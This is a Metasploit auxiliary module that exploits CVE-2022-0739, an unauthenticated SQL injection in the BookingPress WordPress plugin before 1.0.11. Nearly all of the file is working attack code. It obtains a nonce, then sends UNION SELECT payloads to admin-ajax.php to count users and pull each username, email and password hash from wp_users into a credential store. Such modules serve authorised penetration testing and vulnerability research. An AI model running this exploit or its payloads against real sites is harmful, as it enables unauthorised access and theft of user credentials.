##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary

  include Msf::Auxiliary::Scanner
  include Msf::Exploit::Remote::HttpClient
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Wordpress BookingPress bookingpress_front_get_category_services SQLi',
        'Description' => %q{
          The BookingPress WordPress plugin before 1.0.11 fails to properly sanitize user supplied POST data before it is used in
          a dynamically constructed SQL query via the bookingpress_front_get_category_services AJAX action (available to
          unauthenticated users), leading to an unauthenticated SQL Injection.
        },
        'Author' => [
          'cyllective', # discovery
          'jheysel-r7' # module
        ],
        'References' => [
          [ 'URL', 'https://github.com/destr4ct/CVE-2022-0739'],
          [ 'WPVDB', '388cd42d-b61a-42a4-8604-99b812db2357'],
          [ 'CVE', '2022-0739']
        ],
        'License' => MSF_LICENSE,
        'DisclosureDate' => '2022-02-28',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS]
        }
      )
    )

    register_options([
      OptString.new('TARGETURI',[ true, 'The webpage that bookingPress is running on', '/bookingpress/' ])
    ])
  end

  def check
    @nonce = get_user_nonce
    return Exploit::CheckCode::Unknown if @nonce == 'Unable to get wp-nonce for an unauthenticated user'

    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri('/wp-admin/admin-ajax.php'),
      'vars_post' =>
          generate_vars_post(') UNION ALL SELECT @@VERSION,2,3,4,5,6,7,count(*),9 from wp_users-- -')
    })

    return Exploit::CheckCode::Vulnerable if res&.code == 200 && res.body.include?('bookingpress_service_position')

    Exploit::CheckCode::Safe
  end

  def get_number_of_users
    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri('/wp-admin/admin-ajax.php'),
      'vars_post' =>
         generate_vars_post(') UNION ALL SELECT @@VERSION,2,3,4,5,6,7,count(*),9 from wp_users-- -')
    })

    fail_with(Failure::UnexpectedReply, 'There was no response when attempting to extract the number of users from the database') if res.nil?

    number_of_users = res.get_json_document[0]['bookingpress_service_position'].to_i
    fail_with(Failure::UnexpectedReply, 'Unable to extract the number of users from the database') unless number_of_users.is_a? Integer

    number_of_users
  end

  def generate_vars_post(sqli)
    {
      'action' => 'bookingpress_front_get_category_services', # vulnerable action,
      '_wpnonce' => @nonce,
      'category_id' => 1,
      'total_service' => "#{rand(100..10000)}#{sqli}"
    }
  end

  def get_user_nonce
    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(datastore['TARGETURI'])
    })

    return 'Unable to get wp-nonce for an unauthenticated user' unless res&.body&.match("_wpnonce:'(\\w+)' };")

    ::Regexp.last_match(1)
  end

  def run
    @nonce ||= get_user_nonce
    fail_with(Failure::UnexpectedReply, 'Unable to get wp-nonce for an unauthenticated user') if @nonce == 'Unable to get wp-nonce for an unauthenticated user'
    number_of_users = get_number_of_users
    print_status("Found #{number_of_users} users in the database")
    i = 0

    creds_table = Rex::Text::Table.new(
      'Header' => 'Wordpress User Credentials',
      'Indent' => 1,
      'Columns' => ['Username', 'Email', 'Hash']
    )

    print_status('Extracting credential information')
    while i < number_of_users
      res = send_request_cgi({
        'method' => 'POST',
        'uri' => normalize_uri('/wp-admin/admin-ajax.php'),
        'vars_post' => generate_vars_post(") UNION ALL SELECT user_login,user_email,user_pass,NULL,NULL,NULL,NULL,NULL,NULL from wp_users limit 1 offset #{i}-- -")
      })

      fail_with(Failure::UnexpectedReply, 'There was no response when attempting to extract credentials from the database') if res.nil?

      fail_with(Failure::UnexpectedReply, 'Unable to retrieve JSON response from SQL injection') unless res.get_json_document[0].is_a? Hash
      parsed_json = JSON.parse(res&.body)[0]

      unless parsed_json.key?('bookingpress_service_id') && parsed_json.key?('bookingpress_category_id') && parsed_json.key?('bookingpress_service_name')
        fail_with(Failure::Unknown, 'Invalid JSON returned from SQL injection')
      end

      username = parsed_json['bookingpress_service_id']
      email = parsed_json['bookingpress_category_id']
      hash = parsed_json['bookingpress_service_name']
      creds_table << [username, email, hash]
      create_credential({
        workspace_id: myworkspace_id,
        origin_type: :service,
        module_fullname: fullname,
        username: username,
        private_type: :nonreplayable_hash,
        jtr_format: Metasploit::Framework::Hashes.identify_hash(hash),
        private_data: hash,
        service_name: 'WordPress BookingPress Plugin',
        address: datastore['RHOSTS'],
        port: datastore['RPORT'],
        protocol: 'tcp',
        status: Metasploit::Model::Login::Status::UNTRIED,
        email: email
      })

      i += 1
    end
    print_line creds_table.to_s
  end
end
